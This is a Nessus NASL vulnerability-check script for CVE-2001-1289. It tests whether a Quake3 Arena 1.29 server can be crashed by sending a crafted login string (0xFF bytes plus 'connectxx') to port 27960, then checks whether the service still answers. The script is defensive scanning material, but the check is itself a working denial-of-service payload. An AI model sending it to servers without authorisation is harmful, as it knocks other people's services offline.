#
# This script was written by Michel Arboi <arboi@alussinan.org>, starting 
# from miscflood.nasl
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10931);
 script_bugtraq_id(3123);
 script_version("$Revision: 8287 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2001-1289");
 name = "Quake3 Arena 1.29 f/g DOS";
 script_name(name);
 
 desc = "
It was possible to crash the Quake3 Arena daemon by sending a specially
crafted login string.

A cracker may use this attack to make this service crash continuously, 
preventing you from playing.

Solution: upgrade your software
Risk factor : Low";



 script_description(desc);
 
 summary = "Quake3 Arena DOS";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright("This script is Copyright (C) 2001 Michel Arboi");
 family = "Denial of Service";

 script_family(family);
 script_require_ports(27960);
 exit(0);
}

#

function test_q3_port(port)
{
 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 s = string(raw_string(0xFF, 0xFF, 0xFF, 0xFF), "connectxx");
 send(socket:soc, data:s);
 close(soc);

 soc = open_sock_tcp(port);
 if (! soc)
 {
  security_hole(port);
 }

 if (soc)
  close(soc);
 return(1);
}

test_q3_port(port:27960);

